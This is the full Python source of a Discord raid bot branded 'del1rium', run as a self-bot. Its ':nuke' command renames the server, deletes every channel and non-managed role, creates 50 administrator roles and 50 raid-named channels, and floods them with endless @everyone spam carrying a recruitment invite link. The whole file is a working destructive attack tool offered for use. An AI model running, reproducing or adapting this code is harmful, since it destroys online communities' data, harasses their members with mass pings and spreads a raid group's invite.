import discord
from discord.ext import commands
import asyncio
import os
import random
import string
from dotenv import load_dotenv
import platform

# Load environment variables from a .env file
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- ANTI-SECURITY BOT CONFIGURATION ---
SPAM_MESSAGES = [
    "@everyone Raid by del1rium - Join us: https://discord.gg/cJJJWHfnn2",
    "@here The server has been compromised. Join: https://discord.gg/cJJJWHfnn2",
    "This server is now under new management. @everyone Join: https://discord.gg/cJJJWHfnn2"
]
# --- END CONFIGURATION ---

# Bot setup with all intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, self_bot=True)

def clear_console():
    """Clears the console, detecting the operating system."""
    command = 'cls' if platform.system() == 'Windows' else 'clear'
    os.system(command)
    print("Console cleared. Bot is ready.")
    print(f'Anti-Security Bot v4 connected as {bot.user.name}')
    print('Primary command: :nuke')

@bot.event
async def on_ready():
    """Event triggered when the bot is connected and ready."""
    clear_console()

# --- ANTI-SECURITY BOT FUNCTIONS ---

async def change_server_name(guild):
    """Changes the server name to a disruptive, randomized string."""
    try:
        new_name = f"RAIDED BY DEL1RIUM {''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        await guild.edit(name=new_name)
        print(f"Server name changed to: {new_name}")
    except discord.Forbidden:
        print("Error: Insufficient permissions to change the server name.")
    except Exception as e:
        print(f"An error occurred while changing the server name: {e}")

async def create_chaotic_roles(guild):
    """Creates 50 new roles with administrator permissions."""
    print("Initiating mass role creation...")
    admin_permissions = discord.Permissions(administrator=True)
    
    async def create_role(i):
        try:
            role_name = f"hacked-role-{i}-{''.join(random.choices(string.ascii_lowercase, k=5))}"
            role_color = discord.Color(random.randint(0x000000, 0xFFFFFF))
            await guild.create_role(name=role_name, permissions=admin_permissions, color=role_color)
            print(f"Role '{role_name}' created with administrator permissions.")
        except Exception:
            pass

    await asyncio.gather(*(create_role(i) for i in range(50)), return_exceptions=True)
    print("Mass role creation phase completed.")

# --- CORE RAID FUNCTIONS ---

async def spam_pings(channel):
    """Continuously sends randomized pings and messages."""
    while True:
        try:
            message = random.choice(SPAM_MESSAGES)
            await channel.send(message)
            await asyncio.sleep(random.uniform(0.2, 0.8))
        except discord.Forbidden:
            await asyncio.sleep(random.randint(5, 15))
        except Exception:
            await asyncio.sleep(random.randint(10, 20))
            break

@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """
    Anti-Security Nuke Command v4 (More Reliable):
    Executes destructive actions sequentially to ensure completion.
    """
    guild = ctx.guild
    if not guild:
        return

    print(f"Initiating Anti-Security Nuke v4 on server: {guild.name}")

    # --- STEP 1: Initial Destructive Actions ---
    await asyncio.gather(change_server_name(guild), return_exceptions=True)

    # --- STEP 2: Delete all existing channels and roles ---
    print("Deleting existing channels and roles...")
    roles_to_delete = [role for role in guild.roles if not role.is_default() and not role.is_managed()]
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        *(role.delete() for role in roles_to_delete),
        return_exceptions=True
    )
    print("Channels and roles deleted.")

    # --- STEP 3: Create chaotic roles ---
    await create_chaotic_roles(guild)

    # --- STEP 4 (CRITICAL CHANGE): Create all channels first, then start spam ---
    print("Creating 50 new text channels...")
    new_channels = []
    for i in range(50):
        try:
            channel_name = f'raid-by-del1rium-{i+1}'
            # Create channel and add it to a list
            new_channel = await guild.create_text_channel(channel_name)
            new_channels.append(new_channel)
            print(f"Channel '{channel_name}' created.")
        except Exception as e:
            print(f"Failed to create channel {i+1}: {e}")
            pass
    
    print(f"{len(new_channels)} channels created successfully.")

    # --- STEP 5: Start the spam in all newly created channels ---
    if new_channels:
        print("Initiating persistent spam in all new channels...")
        spam_tasks = [spam_pings(channel) for channel in new_channels]
        await asyncio.gather(*spam_tasks, return_exceptions=True)
    
    print("Nuke phase completed. Persistent spam is now active.")
    clear_console()

@bot.event
async def on_command_error(ctx, error):
    """Handles errors for commands."""
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("You must have administrator permissions to use this command.")
        except:
            pass
    else:
        print(f"An ignored command error occurred: {error}")

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN, reconnect=True)
    else:
        print("Error: The DISCORD_TOKEN is not configured. Please set it in your .env file.")

